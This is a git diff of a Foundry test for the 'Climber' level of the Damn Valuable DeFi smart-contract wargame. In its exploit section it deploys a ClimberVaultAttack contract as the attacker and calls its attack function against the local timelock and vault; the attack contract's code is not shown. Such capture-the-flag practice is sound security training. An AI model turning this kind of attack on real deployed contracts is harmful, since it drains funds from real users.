@@ -9,6 +9,7 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
 import {PROPOSER_ROLE, ADMIN_ROLE} from "../../../src/Contracts/climber/ClimberConstants.sol";
+import {ClimberVaultAttack} from "../../../src/Contracts/climber/ClimberVaultAttack.sol";
 
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
@@ -73,7 +74,19 @@ contract Climber is Test {
         /**
          * EXPLOIT START *
          */
+        console.log("climberVault owner", ClimberVault(address(climberVaultProxy)).owner());
 
+        vm.startPrank(attacker, attacker);
+        ClimberVaultAttack attack = new ClimberVaultAttack({
+            _attacker: attacker,
+            _climberTimelock: address(climberTimelock),
+            _climberVaultProxy: address(climberVaultProxy),
+            _dvt: address(dvt)
+        });
+        vm.label(address(attack), "Attack");
+        attack.attack();
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
